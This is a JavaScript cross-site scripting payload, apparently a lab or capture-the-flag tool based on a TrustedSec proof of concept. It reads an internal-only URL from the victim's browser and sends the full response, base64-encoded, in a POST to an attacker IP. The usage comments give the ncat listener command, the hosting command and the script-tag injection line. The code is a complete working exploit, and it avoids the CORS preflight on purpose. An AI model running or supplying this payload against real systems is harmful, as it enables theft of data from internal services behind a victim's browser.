// myexfilxss
// Based on the TrustedSec XSS data-exfil PoC.
// Reads an internal-only URL from the victim's browser and sends
// the whole response back in a single POST body (base64).
// Works with any content type (html, json, js, php output, zip, exe, images...)
// because the response is read as raw bytes, not as text.
// For authorized labs only (HTB, CTF, own environments).

// USAGE
// 1) Start the listener on your machine (receives the exfiltrated data):
//      sudo ncat -klvnp 80
// 2) Set the internal URL to read, in "uri" below (this is the target
//    that is only reachable from the victim's browser, e.g. http://127.0.0.1:8080/).
// 3) Set your own IP in the exfil.open(...) line below (your tun0 / attacker IP).
// 4) Host this file on a different port than the listener (port 80 is taken by ncat):
//      python3 -m http.server 8000
//    and load it through the XSS: <script src="http://YOUR_IP:8000/myexfilxss.js"></script>
// 5) The base64 body arrives at the end of the POST request: decode it with base64 -d.

// Convert raw bytes to base64 (chunked, so big files do not overflow the call stack)
function bytes_to_base64(bytes)
{
	var binary = "";
	var chunk = 0x8000;

	for (var i = 0; i < bytes.length; i += chunk)
	{
		binary += String.fromCharCode.apply(null, bytes.subarray(i, i + chunk));
	}
	return btoa(binary);
}

function stealData()
{
	// INTERNAL URL TO READ: change the URL here
	var uri = "http://127.0.0.1:4566/";

	var xhr = new XMLHttpRequest();
	xhr.open("GET", uri, true);

	// Read the response as raw bytes: no text decoding, nothing gets corrupted
	xhr.responseType = "arraybuffer";

	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			// We have the response back with the data
			var bytes = new Uint8Array(xhr.response);

			// Send the whole response in a single POST body
			// text/plain avoids the CORS preflight
			var exfil = new XMLHttpRequest();
			// YOUR IP: change the IP here (must match the ncat listener on port 80)
			exfil.open("POST", "http://10.10.14.212/exfil", true);
			exfil.setRequestHeader("Content-Type", "text/plain");
			exfil.send(bytes_to_base64(bytes));

			console.log("Done exfiling..");
		}
	};

	xhr.send(null);
}

stealData();
